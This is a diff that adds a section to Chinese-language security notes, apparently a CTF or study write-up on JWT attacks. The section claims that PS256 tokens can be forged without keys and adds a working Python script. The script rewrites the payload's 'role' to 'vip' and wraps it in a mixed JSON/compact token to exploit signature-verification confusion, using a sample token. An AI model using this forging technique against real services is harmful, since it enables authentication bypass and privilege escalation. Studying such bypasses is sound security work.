@@ -132,6 +132,34 @@ xxx.xxx.
 <https://blog.csdn.net/weixin_53090346/article/details/134277438>
 <https://www.cnblogs.com/S1gMa/p/16846438.html>
 
+我们不需要公钥和私钥就可以伪造jwt。
+```
+from json import loads, dumps
+from jwcrypto.common import base64url_encode, base64url_decode
+
+
+# 传入原ps256的jwt，修改payload后，输出新的jwt
+
+def ps256(topic):
+    [header, payload, signature] = topic.split('.')
+    parsed_payload = loads(base64url_decode(payload))
+    print(parsed_payload) # 原始payload
+
+    parsed_payload["role"] = "vip"  # 这里是想替换的字段
+
+    print(dumps(parsed_payload, separators=(',', ':'))) # 将Python对象编码成JSON格式的字符串
+
+    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
+
+    print(fake_payload)
+
+    return '{" ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"} '
+
+
+print(ps256('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTY2MjQ2NTEsImlhdCI6MTcxNjYyMTA1MSwianRpIjoiS245NnNTNW1MXzVqdlpOQmJic0JMQSIsIm5iZiI6MTcxNjYyMTA1MSwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.X7QknL7FHu5ZhkVfe2aqFjyWZfSPHRD_Ja-O7YLmD0ScFQRsF2d6d3p-oslfk3CVUeJZZoS7_Ym7kmz4YNg59hMcRW6zmdzEAk6-4thZE0Y2xJ80b2mvJgm1iV2S7g2spelJIE2Gaa282YLitOO-2HtCZqqVRziYLRQWt8GA2yZoDnUjufVGK8LClu3E6xYF_r2uWW67Z9MyjaZbm6Ni8Nl9to4tDvo7FRN-newIF7i4r01-rJW-baGnnbB7jKPkxLPDT-c2SIe5kAIXkoJvO_So2_FreRETrmZ-PAXq_iIPw6lOr0HYA5C9VXFYiVfwMa97ZfND9x7N2RzsOMBywQ'))
+```
+
+
 
 ^
 ## **RS256加密的jwt**
